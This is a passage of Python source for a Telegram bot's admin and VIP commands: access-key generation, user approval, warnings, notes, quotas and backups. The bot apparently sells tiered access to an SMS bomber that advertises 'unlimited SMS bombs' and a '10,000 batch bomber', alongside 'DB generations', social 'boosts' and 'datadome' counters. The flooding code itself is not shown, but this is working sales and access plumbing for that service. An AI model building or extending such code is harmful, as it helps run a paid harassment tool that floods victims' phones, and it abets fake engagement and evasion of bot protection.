        f"👥 *ᴜsᴇʀ sᴜᴍᴍᴀʀʏ*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 ᴛᴏᴛᴀʟ:     `{total}`\n"
        f"✅ ᴀᴄᴛɪᴠᴇ:    `{active}`\n"
        f"❌ ᴇxᴘɪʀᴇᴅ:   `{expired}`\n"
        f"♾️ ʟɪғᴇᴛɪᴍᴇ:  `{lifetime}`\n"
        f"💎 ᴠɪᴘ:       `{vips}`\n"
        f"💼 ʀᴇsᴇʟʟᴇʀ:  `{resellers}`\n"
        f"🚫 ʙᴀɴɴᴇᴅ:    `{banned}`\n"
        f"🔑 ᴋᴇʏs:      `{len(ACCESS_KEYS)}`",
        parse_mode="Markdown"
    )


async def show_feedbacks_command(update: Update, context: CallbackContext):
    """Owner only: show last 20 feedbacks."""
    if not is_at_least_role(update.effective_user.id, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown")
        return
    if not FEEDBACKS:
        await update.effective_message.reply_text("📭 *No feedbacks stored yet.*", parse_mode="Markdown")
        return
    recent = FEEDBACKS[-20:][::-1]
    lines = []
    for i, fb in enumerate(recent, 1):
        lines.append(f"*{i}.* {fb['username']} — `{fb['ts']}`\n_{fb['text']}_")
    text = "💬 *Last Feedbacks*\n━━━━━━━━━━━━━━━━━━━━\n\n" + "\n\n".join(lines)
    await update.effective_message.reply_text(text[:4000], parse_mode="Markdown")


async def auto_backup_to_owner(context: CallbackContext):
    """Daily job: send access.json + referrals.json to owner DM."""
    try:
        now_str = datetime.datetime.now().strftime("%Y-%m-%d")
        for filepath in [ACCESS_FILE, REFERRAL_FILE, KEYS_FILE]:
            if os.path.exists(filepath):
                with open(filepath, "rb") as f:
                    await context.bot.send_document(
                        chat_id=ADMIN_ID,
                        document=InputFile(f, filename=f"{now_str}_{os.path.basename(filepath)}"),
                        caption=f"🗄️ Auto-backup: `{os.path.basename(filepath)}`",
                        parse_mode="Markdown"
                    )
        logging.info("[auto_backup] Daily backup sent to owner.")
    except Exception as e:
        logging.error(f"[auto_backup] Failed: {e}")



# ══════════════════════════════════════════════════════════════════════════════
# NEW ADMIN COMMANDS + QoL IMPROVEMENTS
# ══════════════════════════════════════════════════════════════════════════════

# ── In-memory storage for new features ───────────────────────────────────────
USER_WARNINGS: dict = {}     # user_id -> [{"reason": str, "ts": str}, ...]
USER_NOTES:    dict = {}     # user_id -> [str, ...]
USER_QUOTAS:   dict = {}     # user_id -> int (daily generate limit override)
WARNING_THRESHOLD = 3        # auto-ban at this many warnings

# ── /approve <user_id> <Nd|Nh|lifetime> ─────────────────────────────────────
async def approve_command(update: Update, context: CallbackContext):
    """/approve <user_id> <duration> — grant access directly (e.g. /approve 123 7d)"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "approve"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown"); return
    args = context.args
    if len(args) < 2:
        await update.effective_message.reply_text("ᴜsᴀɢᴇ: `/approve <user_id> <Nd|Nh|lifetime>`", parse_mode="Markdown"); return
    try:
        target = int(args[0].strip())
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid user ID.", parse_mode="Markdown"); return
    dur = args[1].strip().lower()
    if dur == "lifetime":
        expires_at = None
        label = "♾️ ʟɪғᴇᴛɪᴍᴇ"
    elif dur.endswith("d"):
        days = int(dur[:-1])
        expires_at = (datetime.datetime.now() + datetime.timedelta(days=days)).timestamp()
        label = f"*{days}d*"
    elif dur.endswith("h"):
        hours = int(dur[:-1])
        expires_at = (datetime.datetime.now() + datetime.timedelta(hours=hours)).timestamp()
        label = f"*{hours}h*"
    elif dur.endswith("m"):
        mins = int(dur[:-1])
        expires_at = (datetime.datetime.now() + datetime.timedelta(minutes=mins)).timestamp()
        label = f"*{mins}m*"
    else:
        await update.effective_message.reply_text("❌ Use format: `7d`, `12h`, `30m`, or `lifetime`", parse_mode="Markdown"); return
    USER_ACCESS[target] = expires_at
    USER_ROLES.setdefault(target, "user")
    USER_STATS.setdefault(target, {"generations": 0, "last_active": datetime.datetime.now().isoformat()})
    schedule_save()
    await update.effective_message.reply_text(
        f"✅ *ᴀᴄᴄᴇss ɢʀᴀɴᴛᴇᴅ*\n"
        f"👤 `{target}`\n⏳ Duration: {label}",
        parse_mode="Markdown"
    )
    try:
        await context.bot.send_message(target,
            f"🎉 *ᴀᴄᴄᴇss ᴀᴘᴘʀᴏᴠᴇᴅ!*\n"
            f"ʏᴏᴜʀ ᴀᴄᴄᴇss ʜᴀs ʙᴇᴇɴ ɢʀᴀɴᴛᴇᴅ ʙʏ ᴛʜᴇ ᴀᴅᴍɪɴ.\n"
            f"⏳ *{label}* — ᴜsᴇ /mykey ᴛᴏ ᴄʜᴇᴄᴋ ʏᴏᴜʀ sᴛᴀᴛᴜs.", parse_mode="Markdown"
        )
    except Exception: pass
    await log_to_channel(context.bot, f"✅ APPROVE `{target}` → {label} by `{caller}`")


# ── /genkey <duration> [count] ───────────────────────────────────────────────
async def genkey_command(update: Update, context: CallbackContext):
    """/genkey <duration> [count] — quick key generation from command line"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "genkey"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown"); return
    args = context.args
    if not args:
        await update.effective_message.reply_text("ᴜsᴀɢᴇ: `/genkey <Nd|Nh|lifetime> [count]`", parse_mode="Markdown"); return
    dur = args[0].strip().lower()
    count = int(args[1]) if len(args) > 1 else 1
    count = min(count, 50)
    if dur == "lifetime":
        expires_at = None; days_val = 999999; label = "♾️ lifetime"
    elif dur.endswith("d"):
        days_val = int(dur[:-1]); expires_at = (datetime.datetime.now() + datetime.timedelta(days=days_val)).timestamp(); label = f"{days_val}d"
    elif dur.endswith("h"):
        days_val = int(dur[:-1]) / 24; expires_at = (datetime.datetime.now() + datetime.timedelta(hours=int(dur[:-1]))).timestamp(); label = f"{dur[:-1]}h"
    elif dur.endswith("m"):
        days_val = int(dur[:-1]) / 1440; expires_at = (datetime.datetime.now() + datetime.timedelta(minutes=int(dur[:-1]))).timestamp(); label = f"{dur[:-1]}m"
    else:
        await update.effective_message.reply_text("❌ Use: `7d`, `12h`, `30m`, or `lifetime`", parse_mode="Markdown"); return
    chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    keys = []
    for _ in range(count):
        while True:
            k = f"{KEY_PREFIX}{''.join(random.choices(chars,k=4))}-{''.join(random.choices(chars,k=4))}-{''.join(random.choices(chars,k=4))}"
            if k not in ACCESS_KEYS and k not in USED_KEYS: break
        ACCESS_KEYS[k] = {"expires_at": expires_at, "days": days_val, "created_by": caller, "created_at": datetime.datetime.now().isoformat(), "max_uses": 1, "use_count": 0}
        GLOBAL_STATS["keys_generated_total"] = GLOBAL_STATS.get("keys_generated_total", 0) + 1
        keys.append(k)
    schedule_save()
    lines = "\n".join(f"`{k}`" for k in keys)
    await update.effective_message.reply_text(
        f"🔑 *{count} Key(s) Generated* — `{label}`\n━━━━━━━━━━━━━━━━━━━━\n{lines}",
        parse_mode="Markdown"
    )
    await log_to_channel(context.bot, f"🔑 GENKEY {count}x `{label}` by `{caller}`")


# ── /delkey <KEY> ─────────────────────────────────────────────────────────────
async def delkey_command(update: Update, context: CallbackContext):
    """/delkey <KEY> — delete a specific access key"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "delkey"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown"); return
    if not context.args:
        await update.effective_message.reply_text("ᴜsᴀɢᴇ: `/delkey <KEY>`", parse_mode="Markdown"); return
    key = context.args[0].strip().upper()
    if key in ACCESS_KEYS:
        # Save to undo buffer before deleting (30-min grace)
        _DELETED_KEY_UNDO.clear()
        _DELETED_KEY_UNDO.update({"key": key, "data": dict(ACCESS_KEYS[key]), "ts": time.time()})
        del ACCESS_KEYS[key]; schedule_save()
        await update.effective_message.reply_text(
            f"🗑️ Key `{key}` deleted.\n💡 Use /undodelkey within 30 min to restore.",
            parse_mode="Markdown"
        )
    elif key in USED_KEYS:
        USED_KEYS.discard(key); schedule_save()
        await update.effective_message.reply_text(f"🗑️ Used key `{key}` removed from history.", parse_mode="Markdown")
    else:
        await update.effective_message.reply_text(f"❌ Key `{key}` not found.", parse_mode="Markdown")


# ── /warn <user_id> [reason] ──────────────────────────────────────────────────
async def warn_command(update: Update, context: CallbackContext):
    """/warn <user_id> [reason] — warn a user; auto-ban at threshold"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "warn"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown"); return
    if not context.args:
        await update.effective_message.reply_text("ᴜsᴀɢᴇ: `/warn <user_id> [reason]`", parse_mode="Markdown"); return
    raw_arg = context.args[0].strip()
    if raw_arg.startswith("@"):
        # Username lookup
        target = await userlookup_by_username(raw_arg)
        if target is None:
            await update.effective_message.reply_text(
                f"❌ Username `{escape_md(raw_arg)}` not found in user records.\nNote: user must have interacted with the bot first.",
                parse_mode="Markdown"
            ); return
    else:
        try:
            target = int(raw_arg)
        except ValueError:
            await update.effective_message.reply_text("❌ Invalid user ID or username.", parse_mode="Markdown"); return
    reason = " ".join(context.args[1:]) if len(context.args) > 1 else "No reason given"
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
    USER_WARNINGS.setdefault(target, []).append({"reason": reason, "ts": ts})
    count = len(USER_WARNINGS[target])
    schedule_save()
    await update.effective_message.reply_text(
        f"⚠️ *ᴜsᴇʀ ᴡᴀʀɴᴇᴅ*\n"
        f"👤 `{target}` — Warning *{count}/{WARNING_THRESHOLD}*\n"
        f"📝 Reason: {reason}",
        parse_mode="Markdown"
    )
    try:
        await context.bot.send_message(target,
            f"⚠️ *ʏᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ᴡᴀʀɴᴇᴅ* ({count}/{WARNING_THRESHOLD})\n"
            f"📝 Reason: {reason}\n"
            f"{'🚫 *ɴᴇxᴛ ᴡᴀʀɴɪɴɢ = ʙᴀɴ!*' if count >= WARNING_THRESHOLD - 1 else ''}",
            parse_mode="Markdown")
    except Exception: pass
    if count >= WARNING_THRESHOLD:
        BANNED_USERS.add(target)
        schedule_save()
        await update.effective_message.reply_text(f"🚫 User `{target}` auto-banned after {WARNING_THRESHOLD} warnings.", parse_mode="Markdown")
        try: await context.bot.send_message(target, "🚫 *ʏᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ʙᴀɴɴᴇᴅ* ᴅᴜᴇ ᴛᴏ ᴍᴜʟᴛɪᴘʟᴇ ᴡᴀʀɴɪɴɢs.", parse_mode="Markdown")
        except Exception: pass
    await log_to_channel(context.bot, f"⚠️ WARN `{target}` ({count}/{WARNING_THRESHOLD}) — {reason}")


# ── /warnings <user_id> ───────────────────────────────────────────────────────
async def warnings_command(update: Update, context: CallbackContext):
    """/warnings <user_id> — view all warnings for a user"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "warn"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown"); return
    if not context.args:
        await update.effective_message.reply_text("ᴜsᴀɢᴇ: `/warnings <user_id>`", parse_mode="Markdown"); return
    target = int(context.args[0])
    warns = USER_WARNINGS.get(target, [])
    if not warns:
        await update.effective_message.reply_text(f"✅ User `{target}` has no warnings.", parse_mode="Markdown"); return
    lines = [f"⚠️ *Warnings for `{target}`* ({len(warns)}/{WARNING_THRESHOLD})\n━━━━━━━━━━━━━━━━━━━━"]
    for i, w in enumerate(warns, 1):
        lines.append(f"*{i}.* {w['ts']} — {w['reason']}")
    await update.effective_message.reply_text("\n".join(lines), parse_mode="Markdown")


# ── /clearwarn <user_id> ──────────────────────────────────────────────────────
async def clearwarn_command(update: Update, context: CallbackContext):
    """/clearwarn <user_id> — clear all warnings for a user"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "warn"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown"); return
    if not context.args:
        await update.effective_message.reply_text("ᴜsᴀɢᴇ: `/clearwarn <user_id>`", parse_mode="Markdown"); return
    target = int(context.args[0])
    removed = len(USER_WARNINGS.pop(target, []))
    schedule_save()
    await update.effective_message.reply_text(f"✅ Cleared *{removed}* warning(s) for `{target}`.", parse_mode="Markdown")


# ── /setnote <user_id> <text> ─────────────────────────────────────────────────
async def setnote_command(update: Update, context: CallbackContext):
    """/setnote <user_id> <text> — attach a private note to a user"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "notes"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown"); return
    args = context.args
    if len(args) < 2:
        await update.effective_message.reply_text("ᴜsᴀɢᴇ: `/setnote <user_id> <text>`", parse_mode="Markdown"); return
    target = int(args[0]); text = " ".join(args[1:])
    USER_NOTES.setdefault(target, []).append(f"[{datetime.datetime.now().strftime('%m/%d %H:%M')}] {text}")
    if len(USER_NOTES[target]) > 10: USER_NOTES[target].pop(0)
    await update.effective_message.reply_text(f"📝 Note added to `{target}`:\n_{text}_", parse_mode="Markdown")


# ── /note <user_id> ───────────────────────────────────────────────────────────
async def note_command(update: Update, context: CallbackContext):
    """/note <user_id> — view notes for a user"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown"); return
    if not context.args:
        await update.effective_message.reply_text("ᴜsᴀɢᴇ: `/note <user_id>`", parse_mode="Markdown"); return
    target = int(context.args[0])
    notes = USER_NOTES.get(target, [])
    if not notes:
        await update.effective_message.reply_text(f"📭 No notes for `{target}`.", parse_mode="Markdown"); return
    lines = [f"📝 *Notes for `{target}`*\n━━━━━━━━━━━━━━━━━━━━"] + [f"• {n}" for n in notes]
    await update.effective_message.reply_text("\n".join(lines), parse_mode="Markdown")


# ── /delnote <user_id> ────────────────────────────────────────────────────────
async def delnote_command(update: Update, context: CallbackContext):
    """/delnote <user_id> — clear all notes for a user"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown"); return
    if not context.args:
        await update.effective_message.reply_text("ᴜsᴀɢᴇ: `/delnote <user_id>`", parse_mode="Markdown"); return
    target = int(context.args[0])
    removed = len(USER_NOTES.pop(target, []))
    await update.effective_message.reply_text(f"🗑️ Cleared {removed} note(s) for `{target}`.", parse_mode="Markdown")


# ── /notes — list all users with notes ───────────────────────────────────────
async def notes_command(update: Update, context: CallbackContext):
    """/notes — list all users who have notes"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "notes"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown"); return
    if not USER_NOTES:
        await update.effective_message.reply_text("📭 No notes stored.", parse_mode="Markdown"); return
    lines = [f"📝 *Users with Notes* ({len(USER_NOTES)})\n━━━━━━━━━━━━━━━━━━━━"]
    for uid, nlist in list(USER_NOTES.items())[:30]:
        lines.append(f"• `{uid}` — {len(nlist)} note(s): _{nlist[-1][:60]}_")
    await update.effective_message.reply_text("\n".join(lines), parse_mode="Markdown")


# ── /setquota <user_id> <limit> ───────────────────────────────────────────────
async def setquota_command(update: Update, context: CallbackContext):
    """/setquota <user_id> <daily_limit> — override per-user daily generate limit"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "setquota"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown"); return
    args = context.args
    if len(args) < 2:
        await update.effective_message.reply_text("ᴜsᴀɢᴇ: `/setquota <user_id> <limit>`", parse_mode="Markdown"); return
    target = int(args[0]); limit = int(args[1])
    USER_QUOTAS[target] = limit
    await update.effective_message.reply_text(f"✅ Daily generate quota for `{target}` set to *{limit}*.", parse_mode="Markdown")


# ── /resetstats <user_id> ─────────────────────────────────────────────────────
async def resetstats_command(update: Update, context: CallbackContext):
    """/resetstats <user_id> — reset a user\'s daily usage stats"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "resetstats"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown"); return
    if not context.args:
        await update.effective_message.reply_text("ᴜsᴀɢᴇ: `/resetstats <user_id>`", parse_mode="Markdown"); return
    target = int(context.args[0])
    stats = USER_STATS.get(target, {})
    stats.update({"sms_bomb_today": 0, "boost_today": 0, "generate_today": 0})
    USER_STATS[target] = stats
    USER_LAST_GENERATE.pop(target, None)
    schedule_save()
    await update.effective_message.reply_text(f"✅ Daily stats reset for `{target}`.", parse_mode="Markdown")


# ── /activeusers — list currently active users ────────────────────────────────
async def activeusers_command(update: Update, context: CallbackContext):
    """/activeusers — list users with active (non-expired) access"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "activeusers"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown"); return
    now_ts = time.time()
    active = [(uid, exp) for uid, exp in USER_ACCESS.items()
              if exp is None or (isinstance(exp, (int, float)) and exp > now_ts)]
    if not active:
        await update.effective_message.reply_text("📭 No active users.", parse_mode="Markdown"); return
    lines = [f"✅ *Active Users* ({len(active)})\n━━━━━━━━━━━━━━━━━━━━"]
    for uid, exp in sorted(active, key=lambda x: x[1] if x[1] else float("inf"))[:40]:
        if exp is None:
            label = "♾️ lifetime"
        else:
            days_left = int((exp - now_ts) / 86400)
            label = f"{days_left}d left"
        role = USER_ROLES.get(uid, "user")
        lines.append(f"• `{uid}` [{role}] — {label}")
    if len(active) > 40:
        lines.append(f"_...and {len(active)-40} more_")
    await update.effective_message.reply_text("\n".join(lines), parse_mode="Markdown")


# ── /expiring — list users expiring within 48h ────────────────────────────────
async def expiring_command(update: Update, context: CallbackContext):
    """/expiring — list users whose access expires within 48 hours"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "expiring"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown"); return
    now_ts = time.time()
    cutoff = now_ts + 172800  # 48 hours
    expiring = [(uid, exp) for uid, exp in USER_ACCESS.items()
                if exp is not None and isinstance(exp, (int, float)) and now_ts < exp <= cutoff]
    if not expiring:
        await update.effective_message.reply_text("✅ No users expiring in the next 48 hours.", parse_mode="Markdown"); return
    lines = [f"⚠️ *Expiring Soon* ({len(expiring)})\n━━━━━━━━━━━━━━━━━━━━"]
    for uid, exp in sorted(expiring, key=lambda x: x[1]):
        hours_left = int((exp - now_ts) / 3600)
        exp_str = datetime.datetime.fromtimestamp(exp).strftime("%b %d %H:%M")
        lines.append(f"• `{uid}` — {hours_left}h left (expires {exp_str})")
    await update.effective_message.reply_text("\n".join(lines), parse_mode="Markdown")


# ── /clearlocks — clear all brute-force lockouts ──────────────────────────────
async def clearlocks_command(update: Update, context: CallbackContext):
    """/clearlocks — clear all key brute-force lockouts"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "clearlocks"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown"); return
    count = len(KEY_FAIL_TIMES)
    KEY_FAIL_TIMES.clear()
    KEY_FAIL_COUNTS.clear()
    await update.effective_message.reply_text(f"🔓 Cleared *{count}* lockout(s).", parse_mode="Markdown")


# ── /globalstats — show bot-wide counters ────────────────────────────────────
async def globalstats_command(update: Update, context: CallbackContext):
    """/globalstats — show global bot usage statistics"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "globalstats"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown"); return
    now_ts = time.time()
    active_users = sum(1 for exp in USER_ACCESS.values() if exp is None or (isinstance(exp, (int, float)) and exp > now_ts))
    locked_out = sum(1 for t in KEY_FAIL_TIMES.values() if time.time() - t < KEY_FAIL_WINDOW)
    await update.effective_message.reply_text(
        f"📊 *Global Bot Statistics*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 Keys Generated: *{GLOBAL_STATS.get('keys_generated_total', 0)}*\n"
        f"✅ Keys Redeemed:  *{GLOBAL_STATS.get('keys_redeemed_total', 0)}*\n"
        f"📂 Files Generated:*{GLOBAL_STATS.get('files_generated_total', 0)}*\n"
        f"💣 Bomber Attacks: *{GLOBAL_STATS.get('bomber_attacks_total', 0)}*\n"
        f"🚀 Boost Runs:     *{GLOBAL_STATS.get('boost_requests_total', 0)}*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 Total Users:    *{len(USER_ACCESS)}*\n"
        f"✅ Active Users:   *{active_users}*\n"
        f"🔑 Active Keys:    *{len(ACCESS_KEYS)}*\n"
        f"🚫 Banned Users:   *{len(BANNED_USERS)}*\n"
        f"⚠️ Warned Users:   *{len(USER_WARNINGS)}*\n"
        f"🔒 Locked Out:     *{locked_out}*\n"
        f"📝 Notes:          *{len(USER_NOTES)}*\n"
        f"💬 Feedbacks:      *{len(FEEDBACKS)}*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱️ Uptime: `{get_uptime()}`",
        parse_mode="Markdown"
    )


# ── /backup command (same as admin_backup but from command line) ──────────────
async def admin_backup_command(update: Update, context: CallbackContext):
    """/backup — download a backup of access.json and referrals.json"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "backup"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown"); return
    now_str = datetime.datetime.now().strftime("%Y-%m-%d_%H%M")
    files_sent = 0
    for filepath in [ACCESS_FILE, REFERRAL_FILE]:
        if os.path.exists(filepath):
            with open(filepath, "rb") as f:
                await update.effective_message.reply_document(
                    document=f,
                    filename=f"{now_str}_{os.path.basename(filepath)}",
                    caption=f"💾 Backup: `{os.path.basename(filepath)}`" if files_sent == 0 else None,
                    parse_mode="Markdown"
                )
            files_sent += 1
    if files_sent == 0:
        await update.effective_message.reply_text("⚠️ No backup files found.", parse_mode="Markdown")


# ========== GLOBAL ERROR HANDLER ==========
async def error_handler(update: object, context: CallbackContext) -> None:
    """Catch all unhandled exceptions — log them and DM owner for real errors only."""
    import httpx
    import telegram.error as tg_err

    err = context.error

    # ── Transient network/connection errors ───────────────────────────────────
    # These are caused by Telegram's servers dropping the long-poll connection,
    # brief internet blips, or Telegram API restarts. PTB auto-retries them.
    # Sending a DM for each one just spams the admin and is not actionable.
    TRANSIENT_ERRORS = (
        httpx.ReadError,
        httpx.ConnectError,
        httpx.RemoteProtocolError,
        httpx.TimeoutException,
        tg_err.NetworkError,
        tg_err.TimedOut,
        tg_err.RetryAfter,
    )
    if isinstance(err, TRANSIENT_ERRORS):
        logging.warning(f"[transient network error — ignored] {type(err).__name__}: {err}")
        return  # do NOT DM admin, do NOT reply to user — PTB will auto-retry

    # ── User-blocking errors ──────────────────────────────────────────────────
    # "Forbidden: bot was blocked by the user" — not actionable, just log it
    if isinstance(err, tg_err.Forbidden):
        logging.info(f"[bot blocked by user] {err}")
        return

    # ── BadRequest from our own Markdown ─────────────────────────────────────
    # These are real bugs we want to know about, but are never user-visible
    if isinstance(err, tg_err.BadRequest):
        logging.error(f"[BadRequest — likely Markdown bug] {err}", exc_info=err)
        try:
            await context.bot.send_message(
                ADMIN_ID,
                f"⚠️ *Bot Error (BadRequest)*\n`{str(err)[:300]}`",
                parse_mode="Markdown"
            )
        except Exception:
            pass
        return

    # ── All other real errors: log + DM admin ────────────────────────────────
    logging.error(f"Unhandled exception: {err}", exc_info=err)
    try:
        err_str = str(err)[:300]
        await context.bot.send_message(
            ADMIN_ID,
            f"⚠️ *Bot Error*\n`{err_str}`",
            parse_mode="Markdown"
        )
    except Exception:
        pass
    if isinstance(update, Update) and update.effective_message:
        try:
            await update.effective_message.reply_text(
                "⚠️ *ᴀɴ ᴜɴᴇxᴘᴇᴄᴛᴇᴅ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ.*\n"
                "ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ᴏʀ ᴄᴏɴᴛᴀᴄᴛ @ZyronDevv ",
                parse_mode="Markdown"
            )
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════
# VIP-EXCLUSIVE COMMANDS
# ══════════════════════════════════════════════════════════════════

def _vip_gate(func):
    """Decorator: blocks non-VIP users with a clean upgrade message."""
    import functools
    @functools.wraps(func)
    async def wrapper(update: Update, context: CallbackContext):
        user_id = update.effective_user.id
        if not is_at_least_role(user_id, "vip"):
            msg = (
                "💎 *VIP ᴇxᴄʟᴜsɪᴠᴇ*\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ᴏɴʟʏ ᴀᴠᴀɪʟᴀʙʟᴇ ᴛᴏ *VIP* ᴍᴇᴍʙᴇʀs.\n\n"
                "💡 ᴡʜᴀᴛ VIP ᴜɴʟᴏᴄᴋs:\n"
                "┣ ♾️ ᴜɴʟɪᴍɪᴛᴇᴅ sᴍs ʙᴏᴍʙs\n"
                "┣ ♾️ ᴜɴʟɪᴍɪᴛᴇᴅ ᴅʙ ɢᴇɴᴇʀᴀᴛɪᴏɴs\n"
                "┣ ♾️ ᴜɴʟɪᴍɪᴛᴇᴅ sᴏᴄɪᴀʟ ʙᴏᴏsᴛs\n"
                "┣ 💣 10,000 ʙᴀᴛᴄʜ ʙᴏᴍʙᴇʀ\n"
                "┣ 📊 /ᴠɪᴘsᴛᴀᴛs — ᴀᴅᴠᴀɴᴄᴇᴅ ᴀɴᴀʟʏᴛɪᴄs\n"
                "┣ 📋 /ʙᴜʟᴋɢᴇɴ — ʙᴀᴛᴄʜ ɢᴇɴᴇʀᴀᴛᴇ ᴀʟʟ ᴅʙs\n"
                "┣ 🔍 /ᴄʜᴇᴄᴋᴜᴘ — ᴘᴇʀsᴏɴᴀʟ ᴀᴄᴄᴏᴜɴᴛ sᴄᴀɴ\n"
                "┗ 🎯 /ᴍᴜʟᴛɪʙᴏᴏsᴛ — ʙᴏᴏsᴛ ᴍᴜʟᴛɪᴘʟᴇ ᴛᴀʀɢᴇᴛs\n\n"
                "📞 ᴄᴏɴᴛᴀᴄᴛ @ZyronDevv  ᴛᴏ ᴜᴘɢʀᴀᴅᴇ."
            )
            if update.message:
                await update.message.reply_text(msg, parse_mode="Markdown")
            elif update.callback_query:
                await update.callback_query.answer("💎 VIP only!", show_alert=True)
                await safe_edit(update.callback_query.message, msg, parse_mode="Markdown")
            return
        return await func(update, context)
    return wrapper


# ─── /vipmenu ─────────────────────────────────────────────────────
@_vip_gate
async def vipmenu_command(update: Update, context: CallbackContext):
    """/vipmenu — VIP command hub"""
    user_id = update.effective_user.id
    role = USER_ROLES.get(user_id, "vip")
    exp = USER_ACCESS.get(user_id)
    exp_str = "♾️ Lifetime" if exp is None else datetime.datetime.fromtimestamp(exp).strftime("%b %d, %Y %H:%M")
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 ᴠɪᴘ sᴛᴀᴛs",        callback_data="vip_stats"),
         InlineKeyboardButton("📋 ʙᴜʟᴋ ɢᴇɴ",          callback_data="vip_bulkgen")],
        [InlineKeyboardButton("💣 ᴜɴʟɪᴍɪᴛᴇᴅ ʙᴏᴍʙ",   callback_data="sms_bomber_menu"),
         InlineKeyboardButton("🚀 ᴍᴜʟᴛɪ ʙᴏᴏsᴛ",       callback_data="vip_multiboost")],
        [InlineKeyboardButton("🔍 ᴀᴄᴄᴏᴜɴᴛ ᴄʜᴇᴄᴋᴜᴘ",   callback_data="vip_checkup"),
         InlineKeyboardButton("📁 ᴇxᴘᴏʀᴛ sᴛᴀᴛs",       callback_data="vip_export")],
        [InlineKeyboardButton("⬅️ ᴍᴀɪɴ ᴍᴇɴᴜ",          callback_data="back_to_main_menu")],
    ])
    text = (
        f"💎 *VIP ᴍᴇᴍʙᴇʀ ᴘᴀɴᴇʟ*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 `{user_id}`  ·  🏷️ `{role.upper()}`\n"
        f"⏳ ᴇxᴘɪʀʏ: `{exp_str}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ ᴀʟʟ ʟɪᴍɪᴛs ʀᴇᴍᴏᴠᴇᴅ ғᴏʀ ʏᴏᴜʀ ᴛɪᴇʀ:\n"
        f"┣ ♾️ sᴍs ʙᴏᴍʙ ʀᴜɴs/ᴅᴀʏ\n"
        f"┣ ♾️ ᴅᴀᴛᴀʙᴀsᴇ ɢᴇɴᴇʀᴀᴛɪᴏɴs/ᴅᴀʏ\n"
        f"┣ ♾️ sᴏᴄɪᴀʟ ʙᴏᴏsᴛs/ᴅᴀʏ\n"
        f"┗ 💣 ᴜᴘ ᴛᴏ 10,000 ʙᴀᴛᴄʜ ʙᴏᴍʙᴇʀ\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    await update.effective_message.reply_text(text, reply_markup=keyboard, parse_mode="Markdown")


# ─── /vipstats ────────────────────────────────────────────────────
@_vip_gate
async def vipstats_command(update: Update, context: CallbackContext):
    """/vipstats — detailed personal usage analytics for VIP"""
    user_id = update.effective_user.id
    stats = USER_STATS.get(user_id, {})
    reset_daily_stats_if_needed(user_id)
    now_ts = datetime.datetime.now().timestamp()
    exp = USER_ACCESS.get(user_id)

    days_left = "♾️" if exp is None else f"{max(0, int((exp - now_ts) / 86400))}d"
    bombs_today  = stats.get("sms_bomb_today", 0)
    gen_today    = stats.get("generate_today", 0)
    total_bombs  = stats.get("sms_bomb_count", 0)
    total_gens   = stats.get("generations", 0)
    total_boosts = stats.get("boost_count", 0)
    total_encs   = stats.get("encrypt_count", 0)
    total_dd     = stats.get("datadome_count", 0)
